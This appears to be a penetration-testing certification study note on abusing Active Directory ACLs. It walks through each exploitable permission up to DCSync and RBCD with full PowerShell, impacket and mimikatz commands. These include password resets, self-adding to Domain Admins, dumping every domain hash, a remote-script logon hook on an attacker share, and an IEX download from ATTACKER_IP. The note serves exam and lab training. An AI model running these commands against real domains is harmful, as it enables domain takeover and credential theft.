---
tags: [oscp-journey, spectre, stage-3, pnpt, active-directory, acl-abuse, dacl]
module: 3
cert-stage: pnpt
difficulty: intermediate
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 4 — Active Directory/04.4 — ACL Abuse"]
netgod-refs: []
---

# S3-08 — ACL Abuse

## What AD ACLs Are and Why They Matter

Every object in Active Directory (users, groups, computers, OUs, GPOs) has a Security Descriptor — a set of rules defining who can do what to that object. The part that matters for attackers is the **DACL (Discretionary Access Control List)** — the list of Access Control Entries (ACEs) that grant or deny permissions.

**Why this is a goldmine for attackers:**

AD ACLs are often misconfigured because:
- Legacy permissions granted during migrations are never cleaned up
- Helpdesk and support teams are given "temporary" permissions that become permanent
- Third-party software sets overly permissive ACEs during installation
- Nested group memberships transitively inherit permissions that weren't intended

**A single misconfigured ACE can be the entire path from a helpdesk account to Domain Admin.** BloodHound finds these automatically — this note teaches you how to exploit every edge it shows you.

---

## The Attack Surface — Every Exploitable ACE

### GenericAll — Full Control

The most powerful ACE. `GenericAll` on an object means you can do anything to it.

**On a User:**
- Reset their password (without knowing the current one)
- Add them to any group
- Modify their attributes
- Set an SPN on them (targeted Kerberoasting)
- Disable their account

**On a Group:**
- Add any user to the group

**On a Computer:**
- Perform Resource-Based Constrained Delegation (RBCD) attack

```powershell
# Check if you have GenericAll on a user:
Get-ObjectAcl -SamAccountName targetuser -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}

# If you do — reset their password:
$NewPassword = ConvertTo-SecureString 'NewP@ssword123!' -AsPlainText -Force
Set-ADAccountPassword -Identity targetuser -NewPassword $NewPassword -Reset

# Or via PowerView:
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssword123!' -AsPlainText -Force)

# GenericAll on a group — add yourself:
Add-DomainGroupMember -Identity "Domain Admins" -Members "youruser"
net group "Domain Admins" youruser /add /domain

# Verify:
Get-NetGroupMember "Domain Admins" | select MemberName
```

---

### GenericWrite — Write to Object Attributes

`GenericWrite` lets you modify specific attributes of an object, but not all of them. What you can do depends on which attributes are writable.

**On a User — most impactful: set an SPN (Targeted Kerberoasting):**
```powershell
# Set a fake SPN on the target user:
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn.domain.local'}

# Verify:
Get-NetUser targetuser | select serviceprincipalname

# Now Kerberoast them:
impacket-GetUserSPNs domain.local/youruser:yourpass -dc-ip DC_IP -request-user targetuser -outputfile targeted_tgs.txt

# Crack the hash:
hashcat -m 13100 targeted_tgs.txt /usr/share/wordlists/rockyou.txt

# Clean up SPN after cracking:
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

**On a User — set logon script:**
```powershell
# If you have GenericWrite, set a logon script that runs when the user logs in:
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker_share\evil.ps1'}
# When targetuser logs in, evil.ps1 executes in their context
```

**On a Group — set member attribute:**
```powershell
# Add yourself to the group directly via attribute manipulation:
Set-DomainObject -Identity "IT Admins" -Set @{member="CN=youruser,CN=Users,DC=domain,DC=local"}
```

---

### WriteDACL — Modify the Object's ACL

`WriteDACL` lets you modify the DACL of the target object — meaning you can grant yourself any permission you want, including `GenericAll`.

```powershell
# Grant yourself GenericAll on the target:
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All

# Now exploit it:
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss!' -AsPlainText -Force)

# WriteDACL on the Domain object itself (from BloodHound path):
# Grant yourself DCSync rights:
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity youruser -Rights DCSync
# Now perform DCSync:
impacket-secretsdump domain/youruser:yourpass@DC_IP
```

**WriteDACL on Domain → DCSync is a critical path:**
BloodHound frequently shows non-DA accounts with WriteDACL on the domain root. This is a direct path to all domain hashes.

---

### WriteOwner — Change Object Ownership

If you own an object, you have implicit GenericAll over it (you can set any DACL you want on your own objects).

```powershell
# Take ownership of the target:
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity youruser

# Verify:
Get-ObjectAcl -SamAccountName targetuser -ResolveGUIDs | ? {$_.SecurityIdentifier -match "youruser"}

# Now grant yourself rights:
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All

# Exploit GenericAll:
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss!' -AsPlainText -Force)
```

---

### ForceChangePassword — Reset Without Knowing Current

Allows resetting a user's password without knowing their current password. Appears as the edge `ForceChangePassword` in BloodHound.

```powershell
# PowerView:
$NewPassword = ConvertTo-SecureString 'NewP@ssword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $NewPassword

# net.exe (if simpler tools available):
net user targetuser NewP@ssword123! /domain

# impacket (from Kali):
impacket-changepasswd domain.local/youruser:yourpass@DC_IP -newpass 'NewP@ssword123!' -altuser targetuser -altpass '' -no-pass
# Note: if the target has no current password set, use empty string

# smbpasswd:
smbpasswd -r DC_IP -U targetuser
```

> [!warning] ForceChangePassword in real engagements
> Resetting a user's password breaks their active sessions and may alert them. In real engagements, document the original password hash before resetting so you can restore it. In OSCP/PNPT exams, just reset it and use the new password.

---

### AddMember — Add Users to Groups

Directly allows adding members to a group — without needing GenericAll or GenericWrite.

```powershell
# PowerView:
Add-DomainGroupMember -Identity "IT Admins" -Members "youruser"

# Verify:
Get-NetGroupMember "IT Admins"

# net.exe:
net group "IT Admins" youruser /add /domain

# impacket (from Kali):
impacket-rbcd domain.local/youruser:yourpass -dc-ip DC_IP -action write -delegate-from EVILPC$ -delegate-to targetcomputer$
# (This is specifically for RBCD — standard AddMember uses PowerView)
```

---

### AllExtendedRights — All Extended Rights

Includes the rights for: password reset (ForceChangePassword), reading LAPS passwords, reading gMSA passwords, certificate enrollment. Often more impactful than it appears.

```powershell
# Check what AllExtendedRights gives you on a target:
Get-ObjectAcl -SamAccountName targetuser -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "ExtendedRight"}

# Read LAPS password (if AllExtendedRights on computer object):
Get-DomainComputer TARGET -Properties ms-Mcs-AdmPwd
# ms-Mcs-AdmPwd contains the cleartext local admin password managed by LAPS

# CME LAPS read:
crackmapexec smb TARGET -u youruser -p yourpass -M laps
```

---

## Finding Exploitable ACLs — The Full Workflow

### BloodHound (Primary Method)

```
1. Import BloodHound data
2. Mark your current user as Owned
3. Run: "Shortest Paths from Owned Principals to Domain Admins"
4. Look for edges: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember
5. Click any edge → BloodHound shows the exact exploitation steps in the "Abuse Info" panel
```

**The Abuse Info panel is your cheatsheet** — right-click any edge and select "Help" to see the exact PowerShell commands to exploit it.

### PowerView Manual Enumeration

```powershell
# Find all non-default ACEs in the domain (may be noisy):
Invoke-ACLScanner -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceChangePassword|AddMember"} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# Check ACLs for a specific user you control:
Get-ObjectAcl -SamAccountName youruser -ResolveGUIDs | ? {$_.ActiveDirectoryRights -ne "ReadProperty,GenericExecute"}
# This removes the boring standard rights and shows interesting ones

# Check who has ACEs over a high-value target:
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"}

# Full domain ACL scan (slow but thorough):
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL|WriteOwner"} | select ObjectDN,ActiveDirectoryRights,SecurityIdentifier

# Translate SIDs to names:
$sid = "S-1-5-21-..."
Convert-SidToName $sid
```

### From Kali — impacket dacledit

```bash
# Read ACLs of a specific object:
impacket-dacledit domain.local/youruser:yourpass -dc-ip DC_IP -principal youruser -target targetuser -action read

# Grant DCSync rights (WriteDACL on domain):
impacket-dacledit domain.local/youruser:yourpass -dc-ip DC_IP -principal youruser -target-dn "DC=domain,DC=local" -action write -rights DCSync

# Grant GenericAll on a user:
impacket-dacledit domain.local/youruser:yourpass -dc-ip DC_IP -principal youruser -target targetuser -action write -rights FullControl
```

---

## DCSync — The End Goal

DCSync is the technique of simulating a Domain Controller replication request to extract password hashes for any or all domain users. It requires the following rights on the domain root object:

- `DS-Replication-Get-Changes` (GetChanges)
- `DS-Replication-Get-Changes-All` (GetChangesAll)

Members of Domain Admins, Enterprise Admins, and Domain Controllers have these by default. But if WriteDACL on the domain root exists for a lower-privileged account, you can grant these rights yourself.

### Granting DCSync Rights (via WriteDACL)

```powershell
# PowerView — grant DCSync rights:
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity youruser -Rights DCSync

# Verify:
Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|DCSync"}
```

### Executing DCSync

```bash
# From Kali (impacket — most reliable):
impacket-secretsdump domain/youruser:yourpass@DC_IP

# Target specific user only (quieter):
impacket-secretsdump domain/youruser:yourpass@DC_IP -just-dc-user krbtgt
impacket-secretsdump domain/youruser:yourpass@DC_IP -just-dc-user Administrator

# From Windows (mimikatz):
lsadump::dcsync /domain:domain.local /user:Administrator
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv    # All users, CSV format
```

**secretsdump output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
jsmith:1104:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
```

Once you have the Administrator NT hash → PTH to anywhere. Once you have krbtgt hash → Golden Ticket (permanent domain access).

---

## Resource-Based Constrained Delegation (RBCD) via GenericWrite on Computer

If you have `GenericWrite` on a computer object, you can configure RBCD to allow your controlled machine account to impersonate any user to that computer — including Domain Admins.

**This is an advanced technique** — introduced here, covered fully in S6-01 (CPTS note).

**Simplified chain:**
```
1. You have GenericWrite on TARGETPC$
2. Create or use an existing machine account you control: EVILPC$
3. Write EVILPC$ into TARGETPC$'s msDS-AllowedToActOnBehalfOfOtherIdentity attribute
4. Use Rubeus to request a service ticket for EVILPC$ impersonating Administrator on TARGETPC$
5. Use that ticket to get a shell on TARGETPC$ as Administrator
```

```bash
# From Kali — full RBCD chain:
# Step 1: Create machine account (need MachineAccountQuota > 0, default is 10):
impacket-addcomputer domain.local/youruser:yourpass -dc-ip DC_IP -computer-name EVILPC -computer-pass 'EvilP@ss123!'

# Step 2: Set RBCD attribute on target computer:
impacket-rbcd domain.local/youruser:yourpass -dc-ip DC_IP -action write -delegate-from EVILPC$ -delegate-to TARGETPC$

# Step 3: Get service ticket impersonating Administrator:
impacket-getST domain.local/EVILPC$:'EvilP@ss123!' -dc-ip DC_IP -spn cifs/TARGETPC.domain.local -impersonate Administrator

# Step 4: Use the ticket:
export KRB5CCNAME=Administrator@cifs_TARGETPC.domain.local@DOMAIN.LOCAL.ccache
impacket-psexec -k -no-pass domain.local/Administrator@TARGETPC.domain.local
```

---

## The ACL Abuse Decision Tree

```
BloodHound shows an edge from your user to a target:

GenericAll on User → Reset password OR set SPN (Kerberoast) OR add to group
GenericAll on Group → Add yourself or others to the group
GenericAll on Computer → RBCD attack

GenericWrite on User → Set SPN (Kerberoast) OR set logon script
GenericWrite on Group → Modify member attribute
GenericWrite on Computer → RBCD attack

WriteDACL on User/Group → Grant yourself GenericAll, then exploit
WriteDACL on Domain → Grant yourself DCSync rights → secretsdump

WriteOwner on anything → Take ownership → Grant GenericAll → exploit

ForceChangePassword on User → Reset their password directly

AddMember on Group → Add yourself to the group

AllExtendedRights on Computer → Read LAPS password
AllExtendedRights on User → ForceChangePassword
```

---

## Practical OSCP/PNPT ACL Abuse Scenario

A typical BloodHound finding on OSCP/PNPT:

```
jsmith (compromised) → GenericAll → svc_admin → member of Domain Admins
```

**Exploitation:**
```powershell
# On Windows (in evil-winrm session as jsmith):
# Import PowerView:
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')

# Reset svc_admin's password:
$pass = ConvertTo-SecureString 'H4ck3d!2024' -AsPlainText -Force
Set-DomainUserPassword -Identity svc_admin -AccountPassword $pass

# Verify svc_admin is now accessible:
# Exit current session
```

```bash
# From Kali:
crackmapexec smb DC_IP -u svc_admin -p 'H4ck3d!2024'
# Should show (Pwn3d!) if svc_admin is DA

# Dump all hashes:
impacket-secretsdump domain/svc_admin:'H4ck3d!2024'@DC_IP

# Get root shell:
impacket-psexec domain/svc_admin:'H4ck3d!2024'@DC_IP
```

---

## Quick Reference

```powershell
# BloodHound — mark owned, run shortest path:
# Right-click node → Mark as Owned
# Query: "Shortest Paths from Owned Principals to Domain Admins"

# Find exploitable ACEs (PowerView):
Invoke-ACLScanner -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDACL|WriteOwner"}

# GenericAll/ForceChangePassword — reset password:
$pass = ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $pass

# GenericAll — add to group:
Add-DomainGroupMember -Identity "Domain Admins" -Members "youruser"

# GenericWrite — set SPN for Kerberoasting:
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
# Then: impacket-GetUserSPNs ... -request-user targetuser
# Then: hashcat -m 13100 tgs.txt rockyou.txt
# Then: Set-DomainObject -Identity targetuser -Clear serviceprincipalname

# WriteDACL — grant yourself GenericAll:
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All

# WriteDACL on Domain — grant DCSync:
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity youruser -Rights DCSync

# WriteOwner — take ownership then grant GenericAll:
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity youruser
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All

# AddMember:
Add-DomainGroupMember -Identity "IT Admins" -Members "youruser"

# DCSync (impacket):
impacket-secretsdump domain/youruser:yourpass@DC_IP

# Read LAPS (AllExtendedRights on computer):
Get-DomainComputer TARGET -Properties ms-Mcs-AdmPwd
crackmapexec smb TARGET -u user -p pass -M laps

# dacledit (Kali — grant DCSync):
impacket-dacledit domain.local/user:pass -dc-ip DC_IP -principal user -target-dn "DC=domain,DC=local" -action write -rights DCSync
```

---

## Common Mistakes

> [!warning] ACL abuse mistakes
> 1. **Not checking BloodHound's Abuse Info panel.** Every edge in BloodHound has a Help/Abuse Info section with the exact PowerShell commands. Right-click the edge and read it — it's your cheatsheet.
> 2. **Forgetting to import PowerView before running commands.** PowerView functions won't exist without importing the module first. `IEX(New-Object Net.WebClient).DownloadString(...)` must run in the same session.
> 3. **Not cleaning up SPNs after targeted Kerberoasting.** Leaving a fake SPN set on an account is forensic evidence. Remove it after cracking: `Set-DomainObject -Identity targetuser -Clear serviceprincipalname`.
> 4. **WriteDACL exploitation leaving persistent changes.** Adding yourself DCSync rights or GenericAll on domain objects is highly visible in event logs. In real engagements, document what you changed and restore it. In OSCP, exploit and move on.
> 5. **Not having PowerView loaded when needed.** If you're in an evil-winrm or psexec session and try to run Get-DomainObject without PowerView imported, you get "command not found." Always have the download URL ready.
> 6. **Confusing GenericWrite with GenericAll.** GenericWrite only lets you write specific attributes (SPN, logon script), not reset passwords or add to groups. If your password reset fails with a GenericWrite ACE, you need GenericAll or ForceChangePassword for that.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| TryHackMe — "Enumerating Active Directory" | ACL enumeration with PowerView |
| TryHackMe — "Exploiting Active Directory" | ACL abuse exploitation labs |
| HTB — Forest | WriteDACL → DCSync chain (classic ACL abuse machine) |
| HTB — Support | LDAP enumeration → BloodHound reveals GenericAll → password reset → DA |
| HTB — Scrambled | Kerberos-only environment, RBCD and ticket abuse |
| TCM Security — PEH Course | Full ACL abuse demo including WriteDACL and DCSync |
| BloodHound Abuse Info | Right-click every edge and read the Help panel |
| [[PHANTOM/MODULE 4 — Active Directory/04.4 — ACL Abuse]] | Full technical depth in PHANTOM vault |
